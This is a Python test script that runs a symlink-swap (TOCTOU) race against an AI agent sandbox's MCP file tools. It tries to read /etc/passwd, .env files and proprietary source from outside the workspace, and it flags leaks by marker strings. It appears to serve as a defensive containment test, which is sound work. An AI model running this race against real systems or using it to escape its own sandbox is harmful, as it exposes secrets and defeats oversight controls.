# swap_attack.py - an ACTIVE symlink-swap (TOCTOU) attack on the airlock's MCP file tools.
# Runs in the agent container after the canary. Two threads swap symlinks as fast as they can:
#   src/swap.ts  -> ui.ts (allowed) | ../../../../etc/passwd | /etc/passwd | proprietary/core.ts
#                   | ../.env | /state/source/src/proprietary/core.ts | /forge/forge.yaml
#   src/dswap    -> ui (allowed dir) | /etc | /state/source/src/proprietary | proprietary
# while the main thread makes N MCP read calls through them (read_text_file, read_file,
# read_multiple_files, get_file_info, list_directory). A response is a LEAK if it holds
# content from outside the workspace (/etc/passwd's "root:" line, the airlock policy) or a
# hidden marker. Exit 0 = no leak in N calls, 20 = leak, 11 = could not run.
# Label: FINITE TEST (an attack that did not win in N tries).
import json
import os
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import mcpc  # noqa: E402

W = "/workspace"
N = int(os.environ.get("SWAP_N", "600"))
LEAK_SIGNS = ["root:x:0:0", "root:*:0:0", "FORGE-CANARY-MARKER", "FAKE_", "upstreams:", "secret margin",
              "MARGIN_TABLE"]
STOP = threading.Event()
SWAPS = [0]


def swapper(link, targets):
    tmp = link + ".tmp"
    i = 0
    while not STOP.is_set():
        try:
            if os.path.lexists(tmp):
                os.remove(tmp)
            os.symlink(targets[i % len(targets)], tmp)
            os.replace(tmp, link)  # atomic swap: the link always exists, its target flips
            SWAPS[0] += 1
        except OSError:
            pass
        i += 1


def main():
    try:
        open(f"{W}/src/ui.ts").read()
    except OSError as e:
        print(f"[swap] cannot read the allowed file: {e}")
        return 11
    t1 = threading.Thread(target=swapper, args=(f"{W}/src/swap.ts", [
        "ui.ts", "../../../../etc/passwd", "/etc/passwd", "proprietary/core.ts", "../.env",
        "/state/source/src/proprietary/core.ts", "/forge/forge.yaml", "/source/.env"]), daemon=True)
    t2 = threading.Thread(target=swapper, args=(f"{W}/src/dswap", [
        "ui", "/etc", "/state/source/src/proprietary", "proprietary", "/source/src/proprietary"]), daemon=True)
    t1.start()
    t2.start()
    calls = [("read_text_file", {"path": "src/swap.ts"}), ("read_file", {"path": "src/swap.ts"}),
             ("read_multiple_files", {"paths": ["src/ui.ts", "src/swap.ts"]}),
             ("read_text_file", {"path": "src/dswap/passwd"}), ("read_text_file", {"path": "src/dswap/core.ts"}),
             ("read_text_file", {"path": "src/dswap/button.ts"}), ("list_directory", {"path": "src/dswap"}),
             ("get_file_info", {"path": "src/swap.ts"})]
    leaks, outcomes, t0 = [], {}, time.time()
    for i in range(N):
        tool, args = calls[i % len(calls)]
        ok, code, res = mcpc.call(tool, **args)
        text = json.dumps(res)
        key = f"{tool}:{'ok' if ok else code or 'error'}"
        outcomes[key] = outcomes.get(key, 0) + 1
        if ok and tool == "list_directory" and any(x in text for x in ("passwd", "shadow", "hostname", "core.ts")):
            leaks.append((i, tool, args, text[:200]))
        if any(s in text for s in LEAK_SIGNS):
            leaks.append((i, tool, args, text[:200]))
    STOP.set()
    t1.join(2)
    t2.join(2)
    for x in ("src/swap.ts", "src/dswap"):
        if os.path.lexists(f"{W}/{x}"):
            os.remove(f"{W}/{x}")
    print(f"[swap] {N} MCP calls during {SWAPS[0]} symlink swaps in {round(time.time() - t0, 1)}s; "
          f"leaks={len(leaks)}; outcomes={json.dumps(outcomes, sort_keys=True)}", flush=True)
    for lk in leaks[:5]:
        print(f"[swap] LEAK: {lk}", flush=True)
    return 20 if leaks else 0


if __name__ == "__main__":
    sys.exit(main())
